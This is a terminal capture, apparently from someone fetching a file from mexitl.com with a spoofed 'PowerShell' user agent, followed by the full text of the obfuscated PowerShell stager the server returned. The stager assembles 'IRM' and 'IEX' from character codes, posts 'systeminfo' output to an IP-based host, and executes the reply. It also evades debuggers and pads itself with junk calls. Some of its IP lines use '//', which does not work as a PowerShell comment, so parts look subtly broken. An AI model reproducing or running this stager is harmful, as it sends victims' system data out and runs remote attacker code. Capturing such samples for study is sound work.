└─$ curl -A "PowerShell" mexitl.com/srv/log                                                                   
 
$null = [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic");
$junkHash = @{};
1..5 | % { $junkHash.Add([guid]::NewGuid(), (Get-Random)) };
function Get-TimeMask {
    $epoch = [datetime]'1970-01-01';
    $now = [datetime]::UtcNow;
    return [int64]($now - $epoch).TotalSeconds -band 0xfffffffffffffff0;
}
$t = Get-TimeMask;
// ${a} = 67;
// v${b} = 217;
// ${c} = 228;
// ${d} = 14;
$ip = "${a}.${b}.${c}.${d}";
$null = Get-Counter '\Processor(*)\% Processor Time' -SampleInterval 1 -MaxSamples 1;
$null = Get-EventLog -LogName System -Newest 1 -ErrorAction SilentlyContinue;
$cmdParts = @(
    [char]73 + [char]82 + [char]77,
    "-Uri `"http://${ip}/$t`"",
    "-Method " + [char]80 + [char]79 + [char]83 + [char]84,
    "-Body (`$sys=" + [char]115 + [char]121 + [char]115 + [char]116 + [char]101 + [char]109 + [char]105 + [char]110 + [char]102 + [char]111 + "|Out-String)",
    "-ContentType 'application/octet-stream'",
    "|" + [char]73 + [char]69 + [char]88
);
if ([System.Diagnostics.Debugger]::IsAttached -or $PSVersionTable.PSVersion.Major -lt 5) {
    $null = Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 8);
    exit;
}
$finalCmd = $cmdParts -join " ";
$scriptBlock = [scriptblock]::Create($finalCmd);
try {
    & $scriptBlock;
} catch {
    $null = $_;
}
$junkHash.Clear();
[System.GC]::Collect();
[System.GC]::WaitForPendingFinalizers();
